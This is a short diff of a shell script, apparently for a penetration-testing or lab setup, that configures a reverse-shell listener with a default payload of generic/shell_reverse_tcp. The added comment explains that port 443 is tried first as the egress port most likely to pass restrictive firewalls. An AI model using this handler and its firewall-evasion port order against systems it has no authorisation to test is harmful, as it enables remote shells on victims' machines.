@@ -16,6 +16,8 @@ VM_SH="${VM_SH:-/root/vm.sh}"
 LHOST="${1:?usage: vm-handler.sh <lhost> [tmux-session] [payload]}"
 SESS="${2:-msf}"
 PAYLOAD="${3:-generic/shell_reverse_tcp}"
+# raw-TCP handler (no HTTP framing to match a port to): try 443 first, the single most
+# reliably open egress port on hardened/restrictive firewalls.
 PORTS="443 80 53 8000 8080"
 
 vm() { bash "$VM_SH" "$1"; }
